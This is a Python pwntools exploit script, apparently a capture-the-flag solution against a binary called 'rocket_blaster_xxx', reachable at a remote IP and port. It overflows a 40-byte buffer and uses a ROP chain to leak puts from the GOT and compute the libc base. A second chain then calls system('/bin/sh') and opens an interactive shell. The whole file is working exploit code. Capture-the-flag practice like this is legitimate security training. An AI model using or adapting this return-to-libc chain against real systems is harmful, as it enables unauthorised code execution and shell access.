from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./rocket_blaster_xxx")

libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.59.199", 57263)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 40

print(elf.got)
print(elf.plt)

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)

])

io.sendlineafter(">> ", payload)

io.recvuntil(b"Preparing beta testing..")
io.recvline()

leak = int(hex(u64(io.recvline().strip().ljust(9, b"\x00")[1::])) + "50", 16)

libc.address = leak - libc.sym.puts

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendlineafter(">> ", payload)

io.interactive()
